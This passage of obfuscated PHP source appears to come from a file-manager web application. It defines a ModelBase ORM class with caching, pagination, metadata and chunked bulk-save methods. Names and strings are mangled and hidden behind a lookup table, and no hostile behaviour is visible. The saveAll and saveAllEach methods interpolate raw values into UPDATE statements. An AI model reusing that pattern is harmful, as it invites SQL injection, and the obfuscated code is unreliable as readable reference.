array_unique($°–Ñ[$–ûÍ™¸[410]][1]); $°–Ñ[$–ûÍ™¸[994]] = $–ûÍ™¸[1921]; $“ÖÑ»ñ¢->where($°–Ñ)->setField($–ûÍ™¸[439], 1); } private function recycleMove($…‚ÊÈ®Î, $“»Ì”»î = 1) { $¾§Ğ‘ =& $_SERVER[¤·²È‰º]; $âÑËŒ„ = Model($¾§Ğ‘[1321]); $™ÈÛ¼¢à = Model($¾§Ğ‘[2135]); $Ã‡™”°“ = array($¾§Ğ‘[410] => $…‚ÊÈ®Î); if ($“»Ì”»î) { $âÑËŒ„->where($Ã‡™”°“)->setField($¾§Ğ‘[439], 1); $™ÈÛ¼¢à->eventRecycle($…‚ÊÈ®Î, $¾§Ğ‘[2136]); } else { $ôÂµ®´ = $âÑËŒ„->where($Ã‡™”°“)->find(); $¶‡—ãâ¤ = $ôÂµ®´[$¾§Ğ‘[418]] == $¾§Ğ‘[98]; $ßµÂÕ¬ = $âÑËŒ„->fileNameAuto($ôÂµ®´[$¾§Ğ‘[440]], $ôÂµ®´[$¾§Ğ‘[42]], REPEAT_RENAME_FOLDER, $¶‡—ãâ¤); if ($ßµÂÕ¬ != $ôÂµ®´[$¾§Ğ‘[42]]) { $âÑËŒ„->rename($…‚ÊÈ®Î, $ßµÂÕ¬); } $âÑËŒ„->where($Ã‡™”°“)->setField($¾§Ğ‘[439], 0); $™ÈÛ¼¢à->eventRecycle($…‚ÊÈ®Î, $¾§Ğ‘[2137]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x73\x6f\x75\162\x63\145\123\x65\x63\x72\x65\x74\114\151\163\x74"; public $field = array("\163\157\165\162\x63\145\x49\104", "\x74\x79\x70\145\x49\104", "\143\x72\145\x61\x74\x65\x55\163\145\x72"); } goto dŸÖé¸‚•Ğ; EóğöïçÙ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\151\155\145", "\164\x69\155\145", "\x69\x6e\163\145\162\x74\54\x75\x70\144\141\164\x65", "\x66\x75\x6e\143\x74\x69\157\156"), array("\143\x72\x65\141\164\145\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\151\157\156")); public function setDataAuto($œ‰ƒÇÅÎ) { $this->dataAuto = $œ‰ƒÇÅÎ; } public function __construct($“ãµ¨ßÈ = '', $‰Á®ª¾Î = '', $õ¿ÕÖ‚à = '') { parent::__construct($“ãµ¨ßÈ, $‰Á®ª¾Î, $õ¿ÕÖ‚à); } protected $tableMeta = array(); protected function _beforeInsert(&$‡òŠ ğ, $’÷Øê¡¨) { $®ß·‹° =& $_SERVER[¤·²È‰º]; if (!$this->checkDataAutoHas($®ß·‹°[364])) { return; } $this->dataBeforeFilter($‡òŠ ğ, $®ß·‹°[364]); } protected function _beforeUpdate(&$èêÓ ç¹, $²ıŞ£¥ï) { $ĞÒ‹Ë´ü =& $_SERVER[¤·²È‰º]; if (!$this->checkDataAutoHas($ĞÒ‹Ë´ü[365])) { return; } $this->dataBeforeFilter($èêÓ ç¹, $ĞÒ‹Ë´ü[365]); } protected function _afterSelect(&$®’±¿ÃŞ, $«‰ı‹ú) { if (!is_array($®’±¿ÃŞ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¤·²È‰º][366])) { return; } foreach ($®’±¿ÃŞ as &$ÛÌ„÷¯) { $this->dataAfterFilter($ÛÌ„÷¯); } unset($ÛÌ„÷¯); } protected function _afterFind(&$°£¤Õéî, $„·Éî€) { if (!is_array($°£¤Õéî)) { return; } if (!$this->checkDataAutoHas($_SERVER[¤·²È‰º][366])) { return; } $this->dataAfterFilter($°£¤Õéî); } public static function textEncode($·üÉ‚ß¨) { if (!$·üÉ‚ß¨) { return $·üÉ‚ß¨; } $ø¡¾§ê£ = json_encode($·üÉ‚ß¨); $ø¡¾§ê£ = preg_replace_callback($_SERVER[¤·²È‰º][367], function ($Š½·ÉÕ“) { return addslashes($Š½·ÉÕ“[0]); }, $ø¡¾§ê£); return json_decode($ø¡¾§ê£); } public static function textDecode($æ–’Éµí) { $ğú”÷ßØ =& $_SERVER[¤·²È‰º]; $ÛçËï² = json_encode($æ–’Éµí); $ÛçËï² = preg_replace_callback($ğú”÷ßØ[368], function ($¶›¥ƒ”Ã) { return $_SERVER[¤·²È‰º][107]; }, $ÛçËï²); return json_decode($ÛçËï²); } public function setAutoIncrement($£©›š¢Å) { $Ó÷¼…Ü¯ = array($this->getPk() => $£©›š¢Å); $Ïğ¸È = $this->data($Ó÷¼…Ü¯)->add(); if ($Ïğ¸È) { $this->delete($Ïğ¸È); } } public function getAutoIncrement() { $ù·Æªñ³ = $this->getTableName(); $ÛÑ©’îò = $this->max($this->getPk()); $„¤â¦” = $this->query("\163\150\157\167\x20\x74\141\142\154\145\x20\163\164\141\x74\165\163\x20\167\150\x65\x72\x65\x20\116\x61\155\145\x3d\47{$ù·Æªñ³}\x27"); $é·èöØí = $„¤â¦”[0][$_SERVER[¤·²È‰º][369]]; $”öÜÌÜø = max($ÛÑ©’îò, $é·èöØí); return $”öÜÌÜø; } protected function _callBefore($¸æÎ¯ëí, $äÎÇå¢ø) { return $this->cacheCallCheck($¸æÎ¯ëí, $äÎÇå¢ø, !1); } protected function _callAfter($Ğš—¸šô, $•”Å²Æ‡) { return $this->cacheCallCheck($Ğš—¸šô, $•”Å²Æ‡, !0); } protected function cacheFunctionAlias($‰à„¿Ú¼) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($æÓœİ¼°, $—×ŸÍ¿É, $Ÿøµßµ = false) { $©Ó§ıªï = $this->cacheFunctionAlias($—×ŸÍ¿É); if (!$©Ó§ıªï) { return; } foreach ($©Ó§ıªï as $óá€Š‹‰ => $¾ªŞçª­) { $ìºúÏãş = $¾ªŞçª­[0]; $Ò£ëÁŞö = explode($_SERVER[¤·²È‰º][60], $¾ªŞçª­[1]); if ($æÓœİ¼° == $óá€Š‹‰) { return $this->cacheFunctionGet($óá€Š‹‰, $ìºúÏãş); } if ($Ÿøµßµ && in_array($æÓœİ¼°, $Ò£ëÁŞö)) { $this->cacheFunctionClear($óá€Š‹‰, $ìºúÏãş); } } } public function cacheFunctionGet($Ë—ëÙ•§, $õÄŞíå) { $èÄƒÃ­è = $this->cacheKeyMake($Ë—ëÙ•§, $õÄŞíå); $‰ª“ˆ‰æ = Cache::get($èÄƒÃ­è); if (!is_array($‰ª“ˆ‰æ)) { $‰ª“ˆ‰æ = call_user_func_array(array($this, $Ë—ëÙ•§), array($õÄŞíå, !0)); Cache::set($èÄƒÃ­è, $‰ª“ˆ‰æ); } return $‰ª“ˆ‰æ; } public function cacheFunctionClear($Õ´ù†ŸŸ, $ô‰éÀ·ò) { $¬°íë­ì = $ô‰éÀ·ò; if (!is_array($ô‰éÀ·ò)) { $¬°íë­ì = array($ô‰éÀ·ò); } foreach ($¬°íë­ì as $¶üŞ½×) { $’ıÌ‘ü = $this->cacheKeyMake($Õ´ù†ŸŸ, $¶üŞ½×); Cache::remove($’ıÌ‘ü); } } private function cacheKeyMake($»¢°şƒÜ, $‹§Äô‡‚) { $á³ôÆí =& $_SERVER[¤·²È‰º]; return get_class($this) . $á³ôÆí[11] . $»¢°şƒÜ . $á³ôÆí[370] . $‹§Äô‡‚; } protected function selectPageReset() { $•ºÁ‰êÑ =& $_SERVER[¤·²È‰º]; if (isset($GLOBALS[$•ºÁ‰êÑ[371]])) { return; } $GLOBALS[$•ºÁ‰êÑ[371]] = isset($GLOBALS[$•ºÁ‰êÑ[7]][$•ºÁ‰êÑ[372]]) ? $GLOBALS[$•ºÁ‰êÑ[7]][$•ºÁ‰êÑ[372]] : !1; $GLOBALS[$•ºÁ‰êÑ[373]] = isset($GLOBALS[$•ºÁ‰êÑ[7]][$•ºÁ‰êÑ[362]]) ? $GLOBALS[$•ºÁ‰êÑ[7]][$•ºÁ‰êÑ[362]] : !1; $GLOBALS[$•ºÁ‰êÑ[7]][$•ºÁ‰êÑ[372]] = !1; $GLOBALS[$•ºÁ‰êÑ[7]][$•ºÁ‰êÑ[362]] = !1; } protected function selectPageRestore() { $ÎºÇá¸— =& $_SERVER[¤·²È‰º]; if (!isset($GLOBALS[$ÎºÇá¸—[371]])) { return; } $GLOBALS[$ÎºÇá¸—[7]][$ÎºÇá¸—[372]] = $GLOBALS[$ÎºÇá¸—[371]]; $GLOBALS[$ÎºÇá¸—[7]][$ÎºÇá¸—[362]] = $GLOBALS[$ÎºÇá¸—[373]]; if ($GLOBALS[$ÎºÇá¸—[7]][$ÎºÇá¸—[372]] === !1) { unset($GLOBALS[$ÎºÇá¸—[7]][$ÎºÇá¸—[372]]); } if ($GLOBALS[$ÎºÇá¸—[7]][$ÎºÇá¸—[362]] === !1) { unset($GLOBALS[$ÎºÇá¸—[7]][$ÎºÇá¸—[362]]); } unset($GLOBALS[$ÎºÇá¸—[371]]); unset($GLOBALS[$ÎºÇá¸—[373]]); } protected function selectPage($óú€Äş” = 200, $ãöµÄş… = 1) { $¾Àç‘Ôø =& $_SERVER[¤·²È‰º]; global $in; $ì“³Ú§ = $this->optionsValue(); $½€€’ö = 50000; $óú€Äş” = isset($in[$¾Àç‘Ôø[372]]) && $in[$¾Àç‘Ôø[372]] ? $in[$¾Àç‘Ôø[372]] : $óú€Äş”; if ($óú€Äş” === -1) { $in[$¾Àç‘Ôø[372]] = !1; $½€€’ö = 100000000; $óú€Äş” = $½€€’ö; } $÷¿È¥¨¯ = $ì“³Ú§; $÷¿È¥¨¯[$¾Àç‘Ôø[374]] = array(); $óú€Äş” = intval($óú€Äş”); $óú€Äş” = $óú€Äş” <= 5 ? 5 : ($óú€Äş” >= $½€€’ö ? $½€€’ö : $óú€Äş”); $ãöµÄş… = intval(isset($in[$¾Àç‘Ôø[362]]) && $in[$¾Àç‘Ôø[362]] ? $in[$¾Àç‘Ôø[362]] : $ãöµÄş…); $ãöµÄş… = $ãöµÄş… <= 1 ? 1 : $ãöµÄş…; $Æ“üöÒ» = array(); $çÅØíò¥ = 1; if ($ãöµÄş… == 1 && $çÅØíò¥) { $this->optionsValue($ì“³Ú§); $Æ“üöÒ» = $this->page($ãöµÄş…, $óú€Äş”)->select(); $ïË’Çñâ = is_array($Æ“üöÒ») ? count($Æ“üöÒ») : 0; if ($ïË’Çñâ < $óú€Äş”) { $™»Â¬ş¯ = 1; } else { $this->optionsValue($÷¿È¥¨¯); $ïË’Çñâ = intval($this->count()); $™»Â¬ş¯ = ceil($ïË’Çñâ / $óú€Äş”); } } else { $this->optionsValue($÷¿È¥¨¯); $ïË’Çñâ = intval($this->count()); $™»Â¬ş¯ = ceil($ïË’Çñâ / $óú€Äş”); $ãöµÄş… = $ãöµÄş… >= $™»Â¬ş¯ ? $™»Â¬ş¯ : $ãöµÄş…; $this->optionsValue($ì“³Ú§); $Æ“üöÒ» = $this->page($ãöµÄş…, $óú€Äş”)->select(); } if (!is_array($Æ“üöÒ»)) { $Æ“üöÒ» = array(); } if ($™»Â¬ş¯ == 1) { $ïË’Çñâ = count($Æ“üöÒ»); } $ê±¶¿«ó = array($¾Àç‘Ôø[375] => array($¾Àç‘Ôø[376] => $ïË’Çñâ, $¾Àç‘Ôø[372] => $óú€Äş”, $¾Àç‘Ôø[362] => $ãöµÄş…, $¾Àç‘Ôø[377] => $™»Â¬ş¯), $¾Àç‘Ôø[378] => $Æ“üöÒ»); return $ê±¶¿«ó; } protected function checkLength($×£¶­Ÿš, $ÑàÅ²­© = 0, $éò´¡”í = '') { $¹ ËŞèÊ =& $_SERVER[¤·²È‰º]; $ÑàÅ²­© = $ÑàÅ²­© ? $ÑàÅ²­© : 65536; if (!$×£¶­Ÿš || strlen($×£¶­Ÿš) < $ÑàÅ²­©) { return; } $éò´¡”í = $éò´¡”í ? $éò´¡”í . $¹ ËŞèÊ[81] : $¹ ËŞèÊ[12]; show_json($éò´¡”í . LNG($¹ ËŞèÊ[379]) . "\x28{$ÑàÅ²­©}\x29", !1); } protected function metaSet($‹³îÏØ÷, $–‰œŠØÈ = null, $·…šŞ¥ = null) { $Åìâ°ù€ =& $_SERVER[¤·²È‰º]; if (!$this->tableMeta || !$‹³îÏØ÷) { return !1; } $¶•¥Ÿ‘Ë = $this->tableMeta[$Åìâ°ù€[380]]; $ÀÉ€±ˆş = $this->tableMeta[$Åìâ°ù€[381]]; $µ¿×çøÒ = Model($ÀÉ€±ˆş); $ö¡ïçˆ« = array($¶•¥Ÿ‘Ë => $‹³îÏØ÷, $Åìâ°ù€[382] => $–‰œŠØÈ); if (is_null($–‰œŠØÈ)) { return $µ¿×çøÒ->where(array($¶•¥Ÿ‘Ë => $‹³îÏØ÷))->delete(); } if (is_null($·…šŞ¥) && is_string($–‰œŠØÈ)) { return $µ¿×çøÒ->where($ö¡ïçˆ«)->delete(); } $Ô±¢é¦† = is_array($–‰œŠØÈ) ? $–‰œŠØÈ : array(); if (is_string($–‰œŠØÈ)) { $Ô±¢é¦†[$–‰œŠØÈ] = $·…šŞ¥; } $Ûê•á¸Û = array(); foreach ($Ô±¢é¦† as $óìü‚šŸ => $ÎÌˆ·ª¶) { if (is_null($ÎÌˆ·ª¶) && is_string($óìü‚šŸ)) { $µ¿×çøÒ->where(array($¶•¥Ÿ‘Ë => $‹³îÏØ÷, $Åìâ°ù€[382] => $óìü‚šŸ))->delete(); continue; } $this->checkLength($ÎÌˆ·ª¶, !1, $ÀÉ€±ˆş . $Åìâ°ù€[4] . $óìü‚šŸ); $Ûê•á¸Û[] = array($¶•¥Ÿ‘Ë => $‹³îÏØ÷, $Åìâ°ù€[104] => $óìü‚šŸ, $Åìâ°ù€[383] => $ÎÌˆ·ª¶); } $–Á÷üô¢ = $Åìâ°ù€[384] . $ÀÉ€±ˆş; CacheLock::lock($–Á÷üô¢); $µ¿×çøÒ->where(array($¶•¥Ÿ‘Ë => $‹³îÏØ÷))->addAll($Ûê•á¸Û, array(), !0); CacheLock::unlock($–Á÷üô¢); return !0; } public function metaGet($İŠßÓ³Ö, $ÏÅ¥óŸØ = false) { $ôõõ¬®ì =& $_SERVER[¤·²È‰º]; if (!$this->tableMeta) { return array(); } $éÆˆÂ‘‰ = $this->tableMeta[$ôõõ¬®ì[380]]; $âº‰øÜ‚ = Model($this->tableMeta[$ôõõ¬®ì[381]]); if ($ÏÅ¥óŸØ) { $·¥‰†Ü‰ = array($éÆˆÂ‘‰ => $İŠßÓ³Ö, $ôõõ¬®ì[104] => $ÏÅ¥óŸØ); return $âº‰øÜ‚->where($·¥‰†Ü‰)->getField($ôõõ¬®ì[383]); } $·¥‰†Ü‰ = array($éÆˆÂ‘‰ => $İŠßÓ³Ö); $ÑÊ³Ê”” = $âº‰øÜ‚->field($ôõõ¬®ì[385])->where($·¥‰†Ü‰)->select(); $ÑÊ³Ê”” = array_to_keyvalue($ÑÊ³Ê””, $ôõõ¬®ì[104], $ôõõ¬®ì[383]); return $ÑÊ³Ê””; } private function checkDataAutoHas($ñÌ£öŸ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $™‘×Ù¨) { if (in_array($ñÌ£öŸ, explode($_SERVER[¤·²È‰º][60], $™‘×Ù¨[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Œ™Ùúğİ, $„Ú°íƒÌ) { $‚¤¸ÀÕ¤ =& $_SERVER[¤·²È‰º]; if (!is_array($Œ™Ùúğİ)) { return; } foreach ($this->dataAuto as $ëÅí’¾Â) { $æå–—¯ç = $ëÅí’¾Â[0]; if (!in_array($„Ú°íƒÌ, explode($‚¤¸ÀÕ¤[60], $ëÅí’¾Â[2]))) { continue; } switch (trim($ëÅí’¾Â[3])) { case $‚¤¸ÀÕ¤[330]: case $‚¤¸ÀÕ¤[331]: $¸…æöíš = $ëÅí’¾Â[1]; $ŞºõÂ× = isset($ëÅí’¾Â[4]) ? (array) $ëÅí’¾Â[4] : array(); if ($¸…æöíš == $‚¤¸ÀÕ¤[213] && array_key_exists($æå–—¯ç, $Œ™Ùúğİ)) { if (!$Œ™Ùúğİ[$æå–—¯ç]) { unset($Œ™Ùúğİ[$æå–—¯ç]); } break; } if (isset($Œ™Ùúğİ[$æå–—¯ç])) { array_unshift($ŞºõÂ×, $Œ™Ùúğİ[$æå–—¯ç]); } if ($‚¤¸ÀÕ¤[330] == $ëÅí’¾Â[3]) { $Œ™Ùúğİ[$æå–—¯ç] = call_user_func_array($¸…æöíš, $ŞºõÂ×); } else { $Œ™Ùúğİ[$æå–—¯ç] = call_user_func_array(array(&$this, $¸…æöíš), $ŞºõÂ×); } break; case $‚¤¸ÀÕ¤[279]: if (isset($Œ™Ùúğİ[$æå–—¯ç]) && $Œ™Ùúğİ[$æå–—¯ç]) { $Œ™Ùúğİ[$æå–—¯ç] = call_user_func_array(array(&$this, $ëÅí’¾Â[1]), array($Œ™Ùúğİ[$æå–—¯ç])); } break; case $‚¤¸ÀÕ¤[282]: $Œ™Ùúğİ[$æå–—¯ç] = $Œ™Ùúğİ[$ëÅí’¾Â[1]]; break; case $‚¤¸ÀÕ¤[303]: if (isset($Œ™Ùúğİ[$æå–—¯ç]) && !is_string($Œ™Ùúğİ[$æå–—¯ç])) { $Œ™Ùúğİ[$æå–—¯ç] = json_encode_force($Œ™Ùúğİ[$æå–—¯ç]); } break; case $‚¤¸ÀÕ¤[332]: if ($Œ™Ùúğİ[$æå–—¯ç] === $‚¤¸ÀÕ¤[12]) { unset($Œ™Ùúğİ[$æå–—¯ç]); } break; case $‚¤¸ÀÕ¤[333]: $Œ™Ùúğİ[$æå–—¯ç] = $ëÅí’¾Â[1]; default: break; } } if ($„Ú°íƒÌ == $‚¤¸ÀÕ¤[364]) { $Ì·Úë¹Ì = strtolower($this->db->getDbType()); if (strpos($Ì·Úë¹Ì, $‚¤¸ÀÕ¤[23]) !== 0) { return; } $×“¤Â± = $this->field(!0)->fields; $ì§øó­† = $×“¤Â±[$‚¤¸ÀÕ¤[261]]; if (isset($×“¤Â±[$‚¤¸ÀÕ¤[260]])) { unset($ì§øó­†[$×“¤Â±[$‚¤¸ÀÕ¤[260]]]); } foreach ($ì§øó­† as $èµ¡Ùúè => $„Ú°íƒÌ) { if (!isset($Œ™Ùúğİ[$èµ¡Ùúè])) { $Œ™Ùúğİ[$èµ¡Ùúè] = $‚¤¸ÀÕ¤[12]; } } } } private function dataAfterFilter(&$Ü¹šóÙê) { $öÖ¦Íá =& $_SERVER[¤·²È‰º]; foreach ($this->dataAuto as $Ã¯ğÌ²¯) { $³…ğ´ØÁ = $Ã¯ğÌ²¯[0]; if (!isset($Ü¹šóÙê[$³…ğ´ØÁ])) { continue; } if (!in_array($öÖ¦Íá[366], explode($öÖ¦Íá[60], $Ã¯ğÌ²¯[2]))) { continue; } switch (trim($Ã¯ğÌ²¯[3])) { case $öÖ¦Íá[330]: case $öÖ¦Íá[331]: $³Á†±Úõ = isset($Ã¯ğÌ²¯[4]) ? (array) $Ã¯ğÌ²¯[4] : array(); array_unshift($³Á†±Úõ, $Ü¹šóÙê[$³…ğ´ØÁ]); if (isset($Ã¯ğÌ²¯[4]) && $Ã¯ğÌ²¯[4] == $öÖ¦Íá[386]) { $³Á†±Úõ = array($Ü¹šóÙê[$³…ğ´ØÁ]); } if ($öÖ¦Íá[330] == $Ã¯ğÌ²¯[3]) { $Ü¹šóÙê[$³…ğ´ØÁ] = call_user_func_array($Ã¯ğÌ²¯[1], $³Á†±Úõ); } else { $Ü¹šóÙê[$³…ğ´ØÁ] = call_user_func_array(array(&$this, $Ã¯ğÌ²¯[1]), $³Á†±Úõ); } break; case $öÖ¦Íá[279]: if (isset($Ü¹šóÙê[$³…ğ´ØÁ]) && $Ü¹šóÙê[$³…ğ´ØÁ]) { $Ü¹šóÙê[$³…ğ´ØÁ] = call_user_func_array(array(&$this, $Ã¯ğÌ²¯[1]), array($Ü¹šóÙê[$³…ğ´ØÁ])); } break; case $öÖ¦Íá[282]: $Ü¹šóÙê[$³…ğ´ØÁ] = $Ü¹šóÙê[$Ã¯ğÌ²¯[1]]; break; case $öÖ¦Íá[303]: $ÒÛÔüùÈ = $Ü¹šóÙê[$³…ğ´ØÁ]; $Ü¹šóÙê[$³…ğ´ØÁ] = json_decode($ÒÛÔüùÈ, !0); if (is_null($Ü¹šóÙê[$³…ğ´ØÁ])) { $Ü¹šóÙê[$³…ğ´ØÁ] = $ÒÛÔüùÈ; } break; case $öÖ¦Íá[332]: if ($Ü¹šóÙê[$³…ğ´ØÁ] === $öÖ¦Íá[12]) { unset($Ü¹šóÙê[$³…ğ´ØÁ]); } break; case $öÖ¦Íá[333]: $Ü¹šóÙê[$³…ğ´ØÁ] = $Ã¯ğÌ²¯[1]; break; default: break; } } } public function saveAll($‰“šÓÂ) { $áùÀÂ¶ =& $_SERVER[¤·²È‰º]; $ßóëÁ²› = $this->tablePrefix . $this->tableName; $ÓÌ¢„¹ = self::SQL_WHERE_IN_CHUNK; $‰“šÓÂ = is_array($‰“šÓÂ) ? $‰“šÓÂ : array(); $“éÕñ˜ = $áùÀÂ¶[22]; $Éíş‘Â» = 0; $˜ÍâÊ±Ù = array(); $ãçÂâÓÂ = count($‰“šÓÂ); for ($ªÄÄ¼¯Ü = 0; $ªÄÄ¼¯Ü < $ãçÂâÓÂ; $ªÄÄ¼¯Ü++) { $èõŒÇ© = $‰“šÓÂ[$ªÄÄ¼¯Ü]; if (!is_array($èõŒÇ©) || count($èõŒÇ©) != 4) { continue; } $®äÓ·¸‹ = "\x55\x50\104\101\x54\105\40\140{$ßóëÁ²›}\x60\40\123\x45\124\40{$èõŒÇ©[2]}\x20\75\x20\103\101\123\105\x20{$èõŒÇ©[0]}\x20\xa"; if ($Éíş‘Â» == 0) { $“éÕñ˜ = $®äÓ·¸‹; } $˜ÍâÊ±Ù[] = $áùÀÂ¶[128] . $èõŒÇ©[1] . $áùÀÂ¶[128]; $Éíş‘Â»++; $“éÕñ˜ .= "\x20\x57\x48\x45\116\x20\47{$èõŒÇ©[1]}\47\x20\x54\110\x45\116\x20\47{$èõŒÇ©[3]}\47\40\12"; if ($Éíş‘Â» == $ÓÌ¢„¹ || $ªÄÄ¼¯Ü == $ãçÂâÓÂ - 1) { $—×ÄÃ®• = implode($áùÀÂ¶[60], $˜ÍâÊ±Ù); $“éÕñ˜ .= "\40\x45\116\104\x20\40\127\110\x45\x52\x45\x20{$èõŒÇ©[0]}\40\111\x4e\40\x28{$—×ÄÃ®•}\51\x20"; $this->execute($“éÕñ˜); $Éíş‘Â» = 0; $“éÕñ˜ = $®äÓ·¸‹; $this->chunkEventCheck(count($˜ÍâÊ±Ù)); $˜ÍâÊ±Ù = array(); } } $this->chunkEventSet(); } public function saveAllEach($İ•ÍÏ„») { $†Ñ¿®ı =& $_SERVER[¤·²È‰º]; $šçÀ•ê² = $this->tablePrefix . $this->tableName; foreach ($İ•ÍÏ„» as $ã¶ïûš°) { if (!is_array($ã¶ïûš°) || count($ã¶ïûš°) != 4) { continue; } $½×ñ½™ú = $ã¶ïûš°[0] . $†Ñ¿®ı[387] . $ã¶ïûš°[1] . $†Ñ¿®ı[128]; $çè¬ª´İ = $ã¶ïûš°[2] . $†Ñ¿®ı[387] . $ã¶ïûš°[3] . $†Ñ¿®ı[128]; $ÊÈÙˆëë = "\165\x70\x64\x61\164\x65\40{$šçÀ•ê²}\x20\x73\x65\164\x20{$çè¬ª´İ}\40\167\x68\145\x72\x65\x20{$½×ñ½™ú}\73"; $this->execute($ÊÈÙˆëë); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($éº—ïñ• = false, $­©ó€²ã = false) { $this->_chunkEvent = $éº—ïñ•; $this->_chunkEventParam = $­©ó€²ã; } private function chunkEventCheck($¶€¯¯í…) { if (!$this->_chunkEvent) { return; } $¢¦ûî¸ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¢¦ûî¸[$_SERVER[¤·²È‰º][388]] = $¶€¯¯í…; Hook::trigger($this->_chunkEvent, $¢¦ûî¸); } public function addAll($ˆüÄ–­¨, $ı–—æ«Ë = array(), $­ªÛËÖÂ = false) { $Í¿øñÉ =& $_SERVER[¤·²È‰º]; ignore_timeout(); $ä¬ò· = self::SQL_WHERE_IN_CHUNK; if (empty($ˆüÄ–­¨)) { $this->error = think_lang($Í¿øñÉ[280]); return !1; } $ı–—æ«Ë = $this->_parseOptions($ı–—æ«Ë); foreach ($ˆüÄ–­¨ as $úÑ¾åì => $Ëú¦û—) { $ˆüÄ–­¨[$úÑ¾åì] = $this->_facade($Ëú¦û—); $this->_beforeInsert($ˆüÄ–­¨[$úÑ¾åì], $ı–—æ«Ë); } if (method_exists($this->db, $Í¿øñÉ[281])) { for ($ÛùÉØ = 0; $ÛùÉØ < count($ˆüÄ–­¨); $ÛùÉØ += $ä¬ò·) { $èö¥ñƒÍ = array_slice($ˆüÄ–­¨, $ÛùÉØ, $ä¬ò·); if (!is_array($èö¥ñƒÍ) || count($èö¥ñƒÍ) == 0) { break; } $®¶¸ï¿” = $this->db->insertAll($èö¥ñƒÍ, $ı–—æ«Ë, $­ªÛËÖÂ); $this->chunkEventCheck(count($èö¥ñƒÍ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ˆüÄ–­¨ as $úÑ¾åì => $Ëú¦û—) { $®¶¸ï¿” = $this->db->insert($Ëú¦û—, $ı–—æ«Ë, $­ªÛËÖÂ); } $this->commit(); } if (!1 !== $®¶¸ï¿”) { $á³‚œ› = $this->getLastInsID(); if ($á³‚œ›) { return $á³‚œ›; } } return $®¶¸ï¿”; } public function save($©úŸéûª = '', $ÁÂ‰”¹¶ = array()) { $è¶¶äÂ² =& $_SERVER[¤·²È‰º]; $™ƒîšï¥ = self::SQL_WHERE_IN_CHUNK; $øôí ¸ = $this->optionsValue(); $˜œ‘Ä = $this->findWhereField($øôí ¸); if (!$˜œ‘Ä) { return parent::save($©úŸéûª, $ÁÂ‰”¹¶); } $çŠÁĞğ¸ = 0; $¢ŒÚ»» = $øôí ¸[$è¶¶äÂ²[284]][$˜œ‘Ä][1]; $¢ŒÚ»» = is_array($¢ŒÚ»») ? $¢ŒÚ»» : array(); $ïã©µšŒ = count($¢ŒÚ»»); for ($ÍÍÆ Šä = 0; $ÍÍÆ Šä < $ïã©µšŒ; $ÍÍÆ Šä += $™ƒîšï¥) { $Àß¼ùûÙ = array_slice($¢ŒÚ»», $ÍÍÆ Šä, $™ƒîšï¥); if (!is_array($Àß¼ùûÙ) || count($Àß¼ùûÙ) == 0) { break; } $øôí ¸[$è¶¶äÂ²[284]][$˜œ‘Ä][1] = $Àß¼ùûÙ; $this->optionsValue($øôí ¸); $çŠÁĞğ¸ += parent::save($©úŸéûª, $ÁÂ‰”¹¶); $this->chunkEventCheck(count($Àß¼ùûÙ)); } $this->chunkEventSet(); return $çŠÁĞğ¸; } public function add($³ş¹šÀ« = '', $èº½·ÙÉ = array(), $Ñ·¤ñÅÊ = false) { if ($this->addTaskStatus && is_array($³ş¹šÀ«)) { $this->addTaskData[] = $³ş¹šÀ«; return; } return parent::add($³ş¹šÀ«, $èº½·ÙÉ, $Ñ·¤ñÅÊ); } public function parseWhereLike($Ìà¸ƒ­, $»­ĞÏ»ö = '', $Í¢»ÔÂ = false, &$‚«Ëí = false) { $¼Ê†Ã…Ó =& $_SERVER[¤·²È‰º]; $ˆ¿—¤  = $GLOBALS[$¼Ê†Ã…Ó[6]][$¼Ê†Ã…Ó[389]]; if (!$ˆ¿—¤ [$¼Ê†Ã…Ó[390]]) { return $Ìà¸ƒ­; } if (!is_array($Ìà¸ƒ­)) { return $Ìà¸ƒ­; } $äœ©™Î = array(); $İ­Í¡íÄ = 0; foreach ($Ìà¸ƒ­ as $ ßÓ¾à => $å“¦ñ†Ù) { if (is_array($å“¦ñ†Ù) && count($å“¦ñ†Ù) == 2 && $å“¦ñ†Ù[0] == $¼Ê†Ã…Ó[391] && is_string($å“¦ñ†Ù[1]) && substr($å“¦ñ†Ù[1], 0, 1) == $¼Ê†Ã…Ó[392] && substr($å“¦ñ†Ù[1], strlen($å“¦ñ†Ù[1]) - 1, 1) == $¼Ê†Ã…Ó[392]) { $‚«Ëí = !0; $Üîåá° = is_string($ ßÓ¾à) ? $ ßÓ¾à : $»­ĞÏ»ö; $šŞàïÎÉ = substr($å“¦ñ†Ù[1], 1, strlen($å“¦ñ†Ù[1]) - 2); $šŞàïÎÉ = $this->db->escapeString($šŞàïÎÉ); if (!strpos($Üîåá°, $¼Ê†Ã…Ó[10])) { $Üîåá° = $¼Ê†Ã…Ó[393] . $Üîåá° . $¼Ê†Ã…Ó[393]; } $à²ªŞÅ‹ = $¼Ê†Ã…Ó[198] . $šŞàïÎÉ . $¼Ê†Ã…Ó[198]; $šŞàïÎÉ = str_replace(array($¼Ê†Ã…Ó[10], $¼Ê†Ã…Ó[394], $¼Ê†Ã…Ó[11]), $¼Ê†Ã…Ó[395], $šŞàïÎÉ); if ($ˆ¿—¤ [$¼Ê†Ã…Ó[396]]) { $à²ªŞÅ‹ = $¼Ê†Ã…Ó[397] . $šŞàïÎÉ . $¼Ê†Ã…Ó[398]; if ($ˆ¿—¤ [$¼Ê†Ã…Ó[399]]) { $à²ªŞÅ‹ = $¼Ê†Ã…Ó[398] . $šŞàïÎÉ . $¼Ê†Ã…Ó[397]; } } $äœ©™Î[$İ­Í¡íÄ] = $¼Ê†Ã…Ó[400] . $Üîåá° . $¼Ê†Ã…Ó[401] . $à²ªŞÅ‹ . $¼Ê†Ã…Ó[402]; $İ­Í¡íÄ++; continue; } if 